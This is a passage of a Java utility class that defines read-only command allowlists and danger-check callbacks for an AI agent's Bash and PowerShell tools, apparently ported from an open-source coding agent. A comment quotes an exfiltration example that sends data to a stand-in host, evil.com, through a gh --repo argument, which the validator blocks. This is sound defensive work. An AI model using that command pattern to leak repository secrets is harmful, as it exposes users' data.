package com.nexusai.application.agent.readonly;

import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;
import java.util.Set;
import java.util.regex.Pattern;

/**
 * 共享只读命令表 · 对齐 CC 多个只读校验源，一次建成供 Bash / PowerShell 复用。
 *
 * <p>数据来源（CC 真源，逐条转写，禁简化）：
 * <ul>
 *   <li>PowerShell {@code CMDLET_ALLOWLIST} — {@code Open-ClaudeCode/src/tools/PowerShellTool/readOnlyValidation.ts:129-882}</li>
 *   <li>bash {@code COMMAND_ALLOWLIST} — {@code Open-ClaudeCode/src/tools/BashTool/readOnlyValidation.ts:128-1140}</li>
 *   <li>{@code GIT_READ_ONLY_COMMANDS} / {@code GH_READ_ONLY_COMMANDS} / {@code DOCKER_READ_ONLY_COMMANDS} /
 *       {@code EXTERNAL_READONLY_COMMANDS} — {@code Open-ClaudeCode/src/utils/shell/readOnlyCommandValidation.ts}</li>
 *   <li>{@code COMMON_ALIASES} — {@code Open-ClaudeCode/src/utils/powershell/parser.ts:1326-1456}</li>
 * </ul>
 *
 * <p>全部键统一小写（CC 大小写不敏感）；cmdlet 匹配走 {@link #resolveToCanonical}（别名 → 规范名）。
 * Java 字段 snake_case→camelCase；{@code safeFlags} 语义与 CC 一致：仅当参数在 safeFlags 内才放行；
 * {@code allowAllFlags=true} 表示全部 flag 只读；{@code argLeaksValue=true} 表示需校验参数元素类型。
 */
public final class ReadOnlyCommandTable {

    private ReadOnlyCommandTable() {
        throw new AssertionError("ReadOnlyCommandTable is a utility class — do not instantiate");
    }

    // ════════════════════════════════════════════════════════════════════════
    // Flag 参数类型 · 对齐 CC readOnlyCommandValidation.ts:18-24 FlagArgType
    // ════════════════════════════════════════════════════════════════════════
    public enum FlagArgType {
        NONE, NUMBER, STRING, CHAR, LITERAL_EMPTY_BRACES, LITERAL_EOF
    }

    /**
     * cmdlet 配置 · 对齐 CC {@code CommandConfig}（readOnlyValidation.ts:39-56）。
     *
     * @param safeFlags     白名单 flag 集（CC {@code safeFlags?: string[]}）
     * @param allowAllFlags 全部 flag 只读（CC {@code allowAllFlags?: boolean}）
     * @param argLeaksValue 需校验参数元素类型（CC {@code additionalCommandIsDangerousCallback: argLeaksValue}）
     * @param callback      附加命令危险回调（CC 原名 {@code CommandConfig.additionalCommandIsDangerousCallback}，
     *                      readOnlyValidation.ts:52-55；返回 true 判危险，无则 null）
     */
    public record CmdletConfig(Set<String> safeFlags, boolean allowAllFlags, boolean argLeaksValue,
                               AdditionalCommandIsDangerousCallback callback) {

        public static CmdletConfig safe(String... flags) {
            return new CmdletConfig(Set.of(flags), false, false, null);
        }

        public static CmdletConfig allFlags() {
            return new CmdletConfig(Set.of(), true, false, null);
        }

        public static CmdletConfig allFlagsLeakGuard() {
            return new CmdletConfig(Set.of(), true, true, null);
        }

        public static CmdletConfig safeLeakGuard(String... flags) {
            return new CmdletConfig(Set.of(flags), false, true, null);
        }

        /**
         * 附加危险回调 + safeFlags（allowAllFlags=false, argLeaksValue=false）· 对齐 CC
         * {@code CommandConfig.additionalCommandIsDangerousCallback}（readOnlyValidation.ts:52-55）。
         * 供 ipconfig/hostname/route 挂位置参数拒绝回调（CC :705-712 / :749-755 / :777-791）。
         */
        public static CmdletConfig safeWithCallback(AdditionalCommandIsDangerousCallback cb, String... flags) {
            return new CmdletConfig(Set.of(flags), false, false, cb);
        }
    }

    /**
     * 附加命令危险回调 · 对齐 CC {@code ExternalCommandConfig.additionalCommandIsDangerousCallback}
     * （readOnlyCommandValidation.ts:30-33）。返回 true 表示命令危险（只读校验失败）。
     * args 为命令名之后的 token 列表（如 {@code git branch} 之后的 tokens）。
     */
    @FunctionalInterface
    public interface AdditionalCommandIsDangerousCallback {
        boolean isDangerous(String rawCommand, List<String> args);
    }

    /**
     * 外部命令配置 · 对齐 CC {@code ExternalCommandConfig}（readOnlyCommandValidation.ts:26-38）。
     *
     * @param safeFlags         flag → 参数类型映射（CC {@code safeFlags: Record<string, FlagArgType>}）
     * @param respectsDoubleDash 是否尊重 POSIX {@code --} 结尾（CC 默认 true；pyright/base64 为 false）
     * @param callback          附加命令危险回调（CC {@code additionalCommandIsDangerousCallback}，无则 null）
     */
    public record ExternalCommandConfig(Map<String, FlagArgType> safeFlags, boolean respectsDoubleDash,
                                        AdditionalCommandIsDangerousCallback callback) {

        /** 兼容两参直构（callback=null）· 供无需回调的条目（git diff/log/docker 等）与 pyright 使用。 */
        public ExternalCommandConfig(Map<String, FlagArgType> safeFlags, boolean respectsDoubleDash) {
            this(safeFlags, respectsDoubleDash, null);
        }

        public static ExternalCommandConfig ex(Object... flagTypePairs) {
            Map<String, FlagArgType> m = new LinkedHashMap<>();
            for (int i = 0; i + 1 < flagTypePairs.length; i += 2) {
                m.put((String) flagTypePairs[i], (FlagArgType) flagTypePairs[i + 1]);
            }
            return new ExternalCommandConfig(Map.copyOf(m), true);
        }

        /**
         * respectsDoubleDash=true + 附加危险回调（CC {@code additionalCommandIsDangerousCallback}）。
         * 仅提供 Map 重载（非 varargs）：与 {@link #ex(Object...)} 不同，本工厂接受已建好的
         * safeFlags Map（git reflog 等用 mergeFlags/flags 构造），避免 varargs + 方法引用的
         * 重载解析歧义。
         */
        public static ExternalCommandConfig exCallback(AdditionalCommandIsDangerousCallback cb, Map<String, FlagArgType> safeFlags) {
            return new ExternalCommandConfig(Map.copyOf(safeFlags), true, cb);
        }
    }

    // ════════════════════════════════════════════════════════════════════════
    // 附加命令危险回调实现 · 对齐 CC readOnlyCommandValidation.ts:270-920 / 944-982
    // ════════════════════════════════════════════════════════════════════════

    /**
     * git reflog 危险回调 · 对齐 CC readOnlyCommandValidation.ts:283-303。
     * 拒绝 expire/delete/exists（写 .git/logs/**）；首个位置参数为 show/HEAD/refs 安全；
     * 裸 git reflog 安全（无位置参数）。
     */
    private static boolean gitReflogDangerous(String rawCommand, List<String> args) {
        Set<String> dangerousSubcommands = Set.of("expire", "delete", "exists");
        for (String token : args) {
            if (token == null || token.isEmpty() || token.startsWith("-")) continue;
            // 首个非 flag 位置参数：危险子命令 → true；否则（show/HEAD/refs）安全
            if (dangerousSubcommands.contains(token)) {
                return true;
            }
            return false;
        }
        return false; // 无位置参数 = 裸 git reflog = show（安全）
    }

    /**
     * git remote show 危险回调 · 对齐 CC readOnlyCommandValidation.ts:478-487。
     * 过滤掉 '-n' 后须恰为 1 个位置参数且匹配 /^[a-zA-Z0-9_-]+$/，否则危险。
     */
    private static boolean gitRemoteShowDangerous(String rawCommand, List<String> args) {
        List<String> positional = new java.util.ArrayList<>();
        for (String a : args) {
            if (!"-n".equals(a)) positional.add(a);
        }
        if (positional.size() != 1) return true;
        return !positional.get(0).matches("^[a-zA-Z0-9_-]+$");
    }

    /**
     * git remote 危险回调 · 对齐 CC readOnlyCommandValidation.ts:495-501。
     * 只允许裸 git remote 或 -v/--verbose；其余任何 arg → 危险。
     */
    private static boolean gitRemoteDangerous(String rawCommand, List<String> args) {
        for (String a : args) {
            if (!"-v".equals(a) && !"--verbose".equals(a)) {
                return true;
            }
        }
        return false;
    }

    /**
     * git tag 危险回调 · 对齐 CC readOnlyCommandValidation.ts:739-805。
     * 无 --list/-l（含 -li/-il 捆绑）时出现位置参数 → 危险（创建 tag 写 .git/refs/tags/）。
     * flagsWithArgs 消费下一 token；'--' 后全位置参数仍受 seenListFlag 门控。
     */
    private static boolean gitTagDangerous(String rawCommand, List<String> args) {
        Set<String> flagsWithArgs = Set.of(
            "--contains", "--no-contains", "--merged", "--no-merged", "--points-at", "--sort", "--format", "-n");
        int i = 0;
        boolean seenListFlag = false;
        boolean seenDashDash = false;
        while (i < args.size()) {
            String token = args.get(i);
            if (token == null || token.isEmpty()) {
                i++;
                continue;
            }
            // '--' 结束 flag 解析，其后全位置参数（git tag -- -l 创建名为 -l 的 tag）
            if ("--".equals(token) && !seenDashDash) {
                seenDashDash = true;
                i++;
                continue;
            }
            if (!seenDashDash && token.startsWith("-")) {
                // --list/-l 精确匹配，或短捆绑（-li/-il）含 'l'
                if ("--list".equals(token) || "-l".equals(token)) {
                    seenListFlag = true;
                } else if (token.charAt(0) == '-' && token.length() > 2 && token.charAt(1) != '-'
                        && !token.contains("=") && token.substring(1).contains("l")) {
                    seenListFlag = true;
                }
                if (token.contains("=")) {
                    i++;
                } else if (flagsWithArgs.contains(token)) {
                    i += 2;
                } else {
                    i++;
                }
            } else {
                // 非 flag 位置参数：无 --list 前缀即 tag 创建 → 危险
                if (!seenListFlag) {
                    return true;
                }
                i++;
            }
        }
        return false;
    }

    /**
     * git branch 危险回调 · 对齐 CC readOnlyCommandValidation.ts:851-921。
     * 无 --list/-l 且非 --merged/--no-merged 可选参消费时出现位置参数 → 危险（创建分支）。
     * --abbrev 已从 flagsWithArgs 移除（git PARSE_OPT_OPTARG 附着-only，detached N 为位置参数 → 本回调拦截）。
     */
    private static boolean gitBranchDangerous(String rawCommand, List<String> args) {
        Set<String> flagsWithArgs = Set.of(
            "--contains", "--no-contains", "--points-at", "--sort");
        Set<String> flagsWithOptionalArgs = Set.of("--merged", "--no-merged");
        int i = 0;
        String lastFlag = "";
        boolean seenListFlag = false;
        boolean seenDashDash = false;
        while (i < args.size()) {
            String token = args.get(i);
            if (token == null || token.isEmpty()) {
                i++;
                continue;
            }
            if ("--".equals(token) && !seenDashDash) {
                seenDashDash = true;
                lastFlag = "";
                i++;
                continue;
            }
            if (!seenDashDash && token.startsWith("-")) {
                if ("--list".equals(token) || "-l".equals(token)) {
                    seenListFlag = true;
                } else if (token.charAt(0) == '-' && token.length() > 2 && token.charAt(1) != '-'
                        && !token.contains("=") && token.substring(1).contains("l")) {
                    seenListFlag = true;
                }
                if (token.contains("=")) {
                    lastFlag = token.split("=")[0];
                    i++;
                } else if (flagsWithArgs.contains(token)) {
                    lastFlag = token;
                    i += 2;
                } else {
                    lastFlag = token;
                    i++;
                }
            } else {
                // 位置参数：无 --list 且 lastFlag 非可选参 flag → 分支创建（危险）
                boolean lastFlagHasOptionalArg = flagsWithOptionalArgs.contains(lastFlag);
                if (!seenListFlag && !lastFlagHasOptionalArg) {
                    return true;
                }
                i++;
            }
        }
        return false;
    }

    /**
     * gh 共享危险回调 · 对齐 CC readOnlyCommandValidation.ts:944-982 ghIsDangerousCallback。
     * 对每个 token：'-x' 形式取 '=' 后值；值含 '://' → true、含 '@' → true、
     * 斜杠计数 ≥ 2（HOST/OWNER/REPO 三段）→ true；无 '/'/':'/'@' 的值跳过。
     * 阻断 {@code gh pr view 1 --repo evil.com/SECRET/x}（三段 exfil）。
     */
    private static boolean ghIsDangerousCallback(String rawCommand, List<String> args) {
        for (String token : args) {
            if (token == null || token.isEmpty()) continue;
            // flag token 取 '=' 后值（--repo=evil.com/SECRET/x 单 token 也须检查）
            String value = token;
            if (token.startsWith("-")) {
                int eqIdx = token.indexOf('=');
                if (eqIdx == -1) continue; // 无 inline 值的 flag，无内容可查
                value = token.substring(eqIdx + 1);
                if (value.isEmpty()) continue;
            }
            // 跳过明显非 repo spec 的值（无 '/' 且无 '://' 且无 '@'）
            if (!value.contains("/") && !value.contains("://") && !value.contains("@")) {
                continue;
            }
            if (value.contains("://")) return true; // URL scheme（https:// http:// git:// ssh://）
            if (value.contains("@")) return true; // SSH-style git@host:owner/repo
            int slashCount = 0;
            for (int k = 0; k < value.length(); k++) {
                if (value.charAt(k) == '/') slashCount++;
            }
            if (slashCount >= 2) return true; // 3+ 段 = HOST/OWNER/REPO（正常格式是 OWNER/REPO 一个斜杠）
        }
        return false;
    }

    /**
     * ipconfig 位置参数危险回调 · 对齐 CC PowerShellTool/readOnlyValidation.ts:705-712。
     * 任一非 {@code /} 且非 {@code -} 前缀的位置参数判危险（macOS {@code ipconfig set <iface> <mode>}
     * 写系统配置；Windows ipconfig 仅 /flags 显示）。裸 ipconfig / ipconfig /all 安全。
     */
    private static boolean ipconfigPositionalDangerous(String rawCommand, List<String> args) {
        for (String a : args) {
            if (a == null) continue;
            if (!a.startsWith("/") && !a.startsWith("-")) return true;
        }
        return false;
    }

    /**
     * hostname 位置参数危险回调 · 对齐 CC PowerShellTool/readOnlyValidation.ts:749-755。
     * 任一非 {@code -} 前缀的位置参数判危险（Linux/macOS {@code hostname NAME} 设置主机名）。
     * 同时服务 Bash 侧（对齐 CC BashTool hostname regex :827 语义，仅纯 flag 放行）。
     */
    private static boolean hostnamePositionalDangerous(String rawCommand, List<String> args) {
        for (String a : args) {
            if (a == null) continue;
            if (!a.startsWith("-")) return true;
        }
        return false;
    }

    /**
     * route 危险回调 · 对齐 CC PowerShellTool/readOnlyValidation.ts:777-791。
     * {@code route [-f] [-p] [-4|-6] VERB [args...]}：首个非 {@code -} 前缀位置参数为 verb，
     * verb 缺失（裸 route）或 verb 非 print（大小写不敏感）判危险——只有 route print 只读。
     */
    private static boolean routeDangerous(String rawCommand, List<String> args) {
        String verb = null;
        for (String a : args) {
            if (a == null) continue;
            if (!a.startsWith("-")) {
                verb = a;
                break;
            }
        }
        return verb == null || !verb.equalsIgnoreCase("print");
    }

    // ════════════════════════════════════════════════════════════════════════
    // COMMON_PARAMETERS · 对齐 CC commonParameters.ts:12-30（PowerShell 公共参数）
    // ════════════════════════════════════════════════════════════════════════
    /**
     * PowerShell 公共参数（所有 cmdlet 经 [CmdletBinding()] 接受，只路由 error/warning/progress
     * 流，不能使只读 cmdlet 写）· 对齐 CC {@code COMMON_PARAMETERS}
     * （Open-ClaudeCode/src/tools/PowerShellTool/commonParameters.ts:27-30）。
     *
     * <p>小写带前导 {@code -}（CC 注释：Stored lowercase with leading dash — callers
     * {@code .toLowerCase()} their input）。并集 = {@code COMMON_SWITCHES}
     * （commonParameters.ts:12 的 {@code -verbose}/{@code -debug}）+ {@code COMMON_VALUE_PARAMS}
     * （commonParameters.ts:14-25 的 10 个取值参数），共 12 个。作为 readOnly 链公共参数唯一源：
     * {@link com.nexusai.application.agent.tool.powershell.PowerShellPermissionChain#isAllowlistedCommand}
     * 用它做 continue 跳过（CC readOnlyValidation.ts:1502-1504）。
     */
    public static final Set<String> COMMON_PARAMETERS = Set.of(
        "-verbose", "-debug",
        "-erroraction", "-warningaction", "-informationaction", "-progressaction",
        "-errorvariable", "-warningvariable", "-informationvariable",
        "-outvariable", "-outbuffer", "-pipelinevariable");

    // ════════════════════════════════════════════════════════════════════════
    // COMMON_ALIASES · 对齐 CC parser.ts:1326-1456（PS 别名 → 规范 cmdlet）
    // ════════════════════════════════════════════════════════════════════════
    private static final Map<String, String> COMMON_ALIASES = Map.ofEntries(
        // 目录列出
        Map.entry("ls", "Get-ChildItem"), Map.entry("dir", "Get-ChildItem"), Map.entry("gci", "Get-ChildItem"),
        // 内容读取
        Map.entry("cat", "Get-Content"), Map.entry("type", "Get-Content"), Map.entry("gc", "Get-Content"),
        // 导航
        Map.entry("cd", "Set-Location"), Map.entry("sl", "Set-Location"), Map.entry("chdir", "Set-Location"),
        Map.entry("pushd", "Push-Location"), Map.entry("popd", "Pop-Location"),
        Map.entry("pwd", "Get-Location"), Map.entry("gl", "Get-Location"),
        // 条目
        Map.entry("gi", "Get-Item"), Map.entry("gp", "Get-ItemProperty"),
        Map.entry("ni", "New-Item"), Map.entry("mkdir", "New-Item"), Map.entry("md", "New-Item"),
        Map.entry("ri", "Remove-Item"), Map.entry("del", "Remove-Item"), Map.entry("rd", "Remove-Item"),
        Map.entry("rmdir", "Remove-Item"), Map.entry("rm", "Remove-Item"), Map.entry("erase", "Remove-Item"),
        Map.entry("mi", "Move-Item"), Map.entry("mv", "Move-Item"), Map.entry("move", "Move-Item"),
        Map.entry("ci", "Copy-Item"), Map.entry("cp", "Copy-Item"), Map.entry("copy", "Copy-Item"),
        Map.entry("cpi", "Copy-Item"), Map.entry("si", "Set-Item"), Map.entry("rni", "Rename-Item"),
        Map.entry("ren", "Rename-Item"),
        // 进程
        Map.entry("ps", "Get-Process"), Map.entry("gps", "Get-Process"),
        Map.entry("kill", "Stop-Process"), Map.entry("spps", "Stop-Process"),
        Map.entry("start", "Start-Process"), Map.entry("saps", "Start-Process"),
        Map.entry("sajb", "Start-Job"), Map.entry("ipmo", "Import-Module"),
        // 输出
        Map.entry("echo", "Write-Output"), Map.entry("write", "Write-Output"), Map.entry("sleep", "Start-Sleep"),
        // 帮助
        Map.entry("help", "Get-Help"), Map.entry("man", "Get-Help"), Map.entry("gcm", "Get-Command"),
        // 服务
        Map.entry("gsv", "Get-Service"),
        // 变量
        Map.entry("gv", "Get-Variable"), Map.entry("sv", "Set-Variable"),
        // 历史
        Map.entry("h", "Get-History"), Map.entry("history", "Get-History"),
        // 调用
        Map.entry("iex", "Invoke-Expression"), Map.entry("iwr", "Invoke-WebRequest"),
        Map.entry("irm", "Invoke-RestMethod"), Map.entry("icm", "Invoke-Command"), Map.entry("ii", "Invoke-Item"),
        // PSSession 远程执行面
        Map.entry("nsn", "New-PSSession"), Map.entry("etsn", "Enter-PSSession"), Map.entry("exsn", "Exit-PSSession"),
        Map.entry("gsn", "Get-PSSession"), Map.entry("rsn", "Remove-PSSession"),
        // 杂项
        Map.entry("cls", "Clear-Host"), Map.entry("clear", "Clear-Host"),
        Map.entry("select", "Select-Object"), Map.entry("where", "Where-Object"),
        Map.entry("foreach", "ForEach-Object"), Map.entry("%", "ForEach-Object"), Map.entry("?", "Where-Object"),
        Map.entry("measure", "Measure-Object"), Map.entry("ft", "Format-Table"), Map.entry("fl", "Format-List"),
        Map.entry("fw", "Format-Wide"), Map.entry("oh", "Out-Host"), Map.entry("ogv", "Out-GridView"),
        Map.entry("ac", "Add-Content"), Map.entry("clc", "Clear-Content"),
        Map.entry("tee", "Tee-Object"), Map.entry("epcsv", "Export-Csv"),
        Map.entry("sp", "Set-ItemProperty"), Map.entry("rp", "Remove-ItemProperty"),
        Map.entry("cli", "Clear-Item"), Map.entry("epal", "Export-Alias"),
        // 文本搜索
        Map.entry("sls", "Select-String")
    );

    // ════════════════════════════════════════════════════════════════════════
    // PowerShell CMDLET_ALLOWLIST · 对齐 CC readOnlyValidation.ts:129-882
    // ════════════════════════════════════════════════════════════════════════
    private static final Map<String, CmdletConfig> PS_CMDLET_ALLOWLIST = Map.ofEntries(
        // ── 文件系统（只读）──
        Map.entry("get-childitem", CmdletConfig.safe("-Path", "-LiteralPath", "-Filter", "-Include", "-Exclude",
            "-Recurse", "-Depth", "-Name", "-Force", "-Attributes", "-Directory", "-File", "-Hidden", "-ReadOnly",
            "-System")),
        Map.entry("get-content", CmdletConfig.safe("-Path", "-LiteralPath", "-TotalCount", "-Head", "-Tail", "-Raw",
            "-Encoding", "-Delimiter", "-ReadCount")),
        Map.entry("get-item", CmdletConfig.safe("-Path", "-LiteralPath", "-Force", "-Stream")),
        Map.entry("get-itemproperty", CmdletConfig.safe("-Path", "-LiteralPath", "-Name")),
        Map.entry("test-path", CmdletConfig.safe("-Path", "-LiteralPath", "-PathType", "-Filter", "-Include",
            "-Exclude", "-IsValid", "-NewerThan", "-OlderThan")),
        Map.entry("resolve-path", CmdletConfig.safe("-Path", "-LiteralPath", "-Relative")),
        Map.entry("get-filehash", CmdletConfig.safe("-Path", "-LiteralPath", "-Algorithm", "-InputStream")),
        Map.entry("get-acl", CmdletConfig.safe("-Path", "-LiteralPath", "-Audit", "-Filter", "-Include", "-Exclude")),
        // ── 导航（仅改工作目录）──
        Map.entry("set-location", CmdletConfig.safe("-Path", "-LiteralPath", "-PassThru", "-StackName")),
        Map.entry("push-location", CmdletConfig.safe("-Path", "-LiteralPath", "-PassThru", "-StackName")),
        Map.entry("pop-location", CmdletConfig.safe("-PassThru", "-StackName")),
        // ── 文本搜索/过滤 ──
        Map.entry("select-string", CmdletConfig.safe("-Path", "-LiteralPath", "-Pattern", "-InputObject",
            "-SimpleMatch", "-CaseSensitive", "-Quiet", "-List", "-NotMatch", "-AllMatches", "-Encoding", "-Context",
            "-Raw", "-NoEmphasis")),
        // ── 数据转换 ──
        Map.entry("convertto-json", CmdletConfig.safe("-InputObject", "-Depth", "-Compress", "-EnumsAsStrings",
            "-AsArray")),
        Map.entry("convertfrom-json", CmdletConfig.safe("-InputObject", "-Depth", "-AsHashtable", "-NoEnumerate")),
        Map.entry("convertto-csv", CmdletConfig.safe("-InputObject", "-Delimiter", "-NoTypeInformation", "-NoHeader",
            "-UseQuotes")),
        Map.entry("convertfrom-csv", CmdletConfig.safe("-InputObject", "-Delimiter", "-Header", "-UseCulture")),
        Map.entry("convertto-xml", CmdletConfig.safe("-InputObject", "-Depth", "-As", "-NoTypeInformation")),
        Map.entry("convertto-html", CmdletConfig.safe("-InputObject", "-Property", "-Head", "-Title", "-Body", "-Pre",
            "-Post", "-As", "-Fragment")),
        Map.entry("format-hex", CmdletConfig.safe("-Path", "-LiteralPath", "-InputObject", "-Encoding", "-Count",
            "-Offset")),
        // ── 对象检查 ──
        Map.entry("get-member", CmdletConfig.safe("-InputObject", "-MemberType", "-Name", "-Static", "-View",
            "-Force")),
        Map.entry("get-unique", CmdletConfig.safe("-InputObject", "-AsString", "-CaseInsensitive", "-OnType")),
        Map.entry("compare-object", CmdletConfig.safe("-ReferenceObject", "-DifferenceObject", "-Property",
            "-SyncWindow", "-CaseSensitive", "-Culture", "-ExcludeDifferent", "-IncludeEqual", "-PassThru")),
        Map.entry("join-string", CmdletConfig.safe("-InputObject", "-Property", "-Separator", "-OutputPrefix",
            "-OutputSuffix", "-SingleQuote", "-DoubleQuote", "-FormatString")),
        Map.entry("get-random", CmdletConfig.safe("-InputObject", "-Minimum", "-Maximum", "-Count", "-SetSeed",
            "-Shuffle")),
        // ── 路径工具 ──
        Map.entry("convert-path", CmdletConfig.safe("-Path", "-LiteralPath")),
        Map.entry("join-path", CmdletConfig.safe("-Path", "-ChildPath", "-AdditionalChildPath")),
        Map.entry("split-path", CmdletConfig.safe("-Path", "-LiteralPath", "-Qualifier", "-NoQualifier", "-Parent",
            "-Leaf", "-LeafBase", "-Extension", "-IsAbsolute")),
        // ── 系统信息 ──
        Map.entry("get-hotfix", CmdletConfig.safe("-Id", "-Description")),
        Map.entry("get-itempropertyvalue", CmdletConfig.safe("-Path", "-LiteralPath", "-Name")),
        Map.entry("get-psprovider", CmdletConfig.safe("-PSProvider")),
        // ── 进程/系统 ──
        Map.entry("get-process", CmdletConfig.safe("-Name", "-Id", "-Module", "-FileVersionInfo",
            "-IncludeUserName")),
        Map.entry("get-service", CmdletConfig.safe("-Name", "-DisplayName", "-DependentServices",
            "-RequiredServices", "-Include", "-Exclude")),
        Map.entry("get-computerinfo", CmdletConfig.allFlags()),
        Map.entry("get-host", CmdletConfig.allFlags()),
        Map.entry("get-date", CmdletConfig.safe("-Date", "-Format", "-UFormat", "-DisplayHint", "-AsUTC")),
        Map.entry("get-location", CmdletConfig.safe("-PSProvider", "-PSDrive", "-Stack", "-StackName")),
        Map.entry("get-psdrive", CmdletConfig.safe("-Name", "-PSProvider", "-Scope")),
        Map.entry("get-module", CmdletConfig.safe("-Name", "-ListAvailable", "-All", "-FullyQualifiedName",
            "-PSEdition")),
        Map.entry("get-alias", CmdletConfig.safe("-Name", "-Definition", "-Scope", "-Exclude")),
        Map.entry("get-history", CmdletConfig.safe("-Id", "-Count")),
        Map.entry("get-culture", CmdletConfig.allFlags()),
        Map.entry("get-uiculture", CmdletConfig.allFlags()),
        Map.entry("get-timezone", CmdletConfig.safe("-Name", "-Id", "-ListAvailable")),
        Map.entry("get-uptime", CmdletConfig.allFlags()),
        // ── 输出/杂项（无副作用）──
        Map.entry("write-output", CmdletConfig.safeLeakGuard("-InputObject", "-NoEnumerate")),
        Map.entry("write-host", CmdletConfig.safeLeakGuard("-Object", "-NoNewline", "-Separator",
            "-ForegroundColor", "-BackgroundColor")),
        Map.entry("start-sleep", CmdletConfig.safeLeakGuard("-Seconds", "-Milliseconds", "-Duration")),
        Map.entry("format-table", CmdletConfig.allFlagsLeakGuard()),
        Map.entry("format-list", CmdletConfig.allFlagsLeakGuard()),
        Map.entry("format-wide", CmdletConfig.allFlagsLeakGuard()),
        Map.entry("format-custom", CmdletConfig.allFlagsLeakGuard()),
        Map.entry("measure-object", CmdletConfig.allFlagsLeakGuard()),
        Map.entry("select-object", CmdletConfig.allFlagsLeakGuard()),
        Map.entry("sort-object", CmdletConfig.allFlagsLeakGuard()),
        Map.entry("group-object", CmdletConfig.allFlagsLeakGuard()),
        Map.entry("where-object", CmdletConfig.allFlagsLeakGuard()),
        Map.entry("out-string", CmdletConfig.allFlagsLeakGuard()),
        Map.entry("out-host", CmdletConfig.allFlagsLeakGuard()),
        // ── 网络信息（只读）──
        Map.entry("get-netadapter", CmdletConfig.safe("-Name", "-InterfaceDescription", "-InterfaceIndex",
            "-Physical")),
        Map.entry("get-netipaddress", CmdletConfig.safe("-InterfaceIndex", "-InterfaceAlias", "-AddressFamily",
            "-Type")),
        Map.entry("get-netipconfiguration", CmdletConfig.safe("-InterfaceIndex", "-InterfaceAlias", "-Detailed",
            "-All")),
        Map.entry("get-netroute", CmdletConfig.safe("-InterfaceIndex", "-InterfaceAlias", "-AddressFamily",
            "-DestinationPrefix")),
        Map.entry("get-dnsclientcache", CmdletConfig.safe("-Entry", "-Name", "-Type", "-Status", "-Section",
            "-Data")),
        Map.entry("get-dnsclient", CmdletConfig.safe("-InterfaceIndex", "-InterfaceAlias")),
        // ── 事件日志 ──
        Map.entry("get-eventlog", CmdletConfig.safe("-LogName", "-Newest", "-After", "-Before", "-EntryType",
            "-Index", "-InstanceId", "-Message", "-Source", "-UserName", "-AsBaseObject", "-List")),
        Map.entry("get-winevent", CmdletConfig.safe("-LogName", "-ListLog", "-ListProvider", "-ProviderName",
            "-Path", "-MaxEvents", "-FilterXPath", "-Force", "-Oldest")),
        // ── WMI/CIM ──
        Map.entry("get-cimclass", CmdletConfig.safe("-ClassName", "-Namespace", "-MethodName", "-PropertyName",
            "-QualifierName")),
        // ── Git / gh / docker / dotnet（外部命令校验）──
        Map.entry("git", CmdletConfig.safe()),
        Map.entry("gh", CmdletConfig.safe()),
        Map.entry("docker", CmdletConfig.safe()),
        Map.entry("dotnet", CmdletConfig.safe()),
        // ── Windows 系统命令 ──
        Map.entry("ipconfig", CmdletConfig.safeWithCallback(ReadOnlyCommandTable::ipconfigPositionalDangerous, "/all", "/displaydns", "/allcompartments")),
        Map.entry("netstat", CmdletConfig.safe("-a", "-b", "-e", "-f", "-n", "-o", "-p", "-q", "-r", "-s", "-t",
            "-x", "-y")),
        Map.entry("systeminfo", CmdletConfig.safe("/FO", "/NH")),
        Map.entry("tasklist", CmdletConfig.safe("/M", "/SVC", "/V", "/FI", "/FO", "/NH")),
        Map.entry("where.exe", CmdletConfig.allFlags()),
        Map.entry("hostname", CmdletConfig.safeWithCallback(ReadOnlyCommandTable::hostnamePositionalDangerous, "-a", "-d", "-f", "-i", "-I", "-s", "-y", "-A")),
        Map.entry("whoami", CmdletConfig.safe("/user", "/groups", "/claims", "/priv", "/logonid", "/all", "/fo",
            "/nh")),
        Map.entry("ver", CmdletConfig.allFlags()),
        Map.entry("arp", CmdletConfig.safe("-a", "-g", "-v", "-N")),
        Map.entry("route", CmdletConfig.safeWithCallback(ReadOnlyCommandTable::routeDangerous, "print", "PRINT", "-4", "-6")),
        Map.entry("getmac", CmdletConfig.safe("/FO", "/NH", "/V")),
        // ── 跨平台 CLI ──
        Map.entry("file", CmdletConfig.safe("-b", "--brief", "-i", "--mime", "-L", "--dereference", "--mime-type",
            "--mime-encoding", "-z", "--uncompress", "-p", "--preserve-date", "-k", "--keep-going", "-r", "--raw",
            "-v", "--version", "-0", "--print0", "-s", "--special-files", "-l", "-F", "--separator", "-e", "-P", "-N",
            "--no-pad", "-E", "--extension")),
        Map.entry("tree", CmdletConfig.safe("/F", "/A", "/Q", "/L")),
        Map.entry("findstr", CmdletConfig.safe("/B", "/E", "/L", "/R", "/S", "/I", "/X", "/V", "/N", "/M", "/O", "/P",
            "/C", "/G", "/D", "/A"))
    );
    // ════════════════════════════════════════════════════════════════════════
    // 共享 Git flag 组 · 对齐 CC readOnlyCommandValidation.ts:44-101
    // ════════════════════════════════════════════════════════════════════════
    private static Map<String, FlagArgType> flags(Object... kv) {
        Map<String, FlagArgType> m = new LinkedHashMap<>();
        for (int i = 0; i + 1 < kv.length; i += 2) {
            m.put((String) kv[i], (FlagArgType) kv[i + 1]);
        }
        return m;
    }
    private static final Map<String, FlagArgType> GIT_REF_SELECTION_FLAGS = flags(
        "--all", FlagArgType.NONE, "--branches", FlagArgType.NONE, "--tags", FlagArgType.NONE,
        "--remotes", FlagArgType.NONE);
    private static final Map<String, FlagArgType> GIT_DATE_FILTER_FLAGS = flags(
        "--since", FlagArgType.STRING, "--after", FlagArgType.STRING, "--until", FlagArgType.STRING,
        "--before", FlagArgType.STRING);
    private static final Map<String, FlagArgType> GIT_LOG_DISPLAY_FLAGS = flags(
        "--oneline", FlagArgType.NONE, "--graph", FlagArgType.NONE, "--decorate", FlagArgType.NONE,
        "--no-decorate", FlagArgType.NONE, "--date", FlagArgType.STRING, "--relative-date", FlagArgType.NONE);
    private static final Map<String, FlagArgType> GIT_COUNT_FLAGS = flags(
        "--max-count", FlagArgType.NUMBER, "-n", FlagArgType.NUMBER);
    private static final Map<String, FlagArgType> GIT_STAT_FLAGS = flags(
        "--stat", FlagArgType.NONE, "--numstat", FlagArgType.NONE, "--shortstat", FlagArgType.NONE,
        "--name-only", FlagArgType.NONE, "--name-status", FlagArgType.NONE);
    private static final Map<String, FlagArgType> GIT_COLOR_FLAGS = flags(
        "--color", FlagArgType.NONE, "--no-color", FlagArgType.NONE);
    private static final Map<String, FlagArgType> GIT_PATCH_FLAGS = flags(
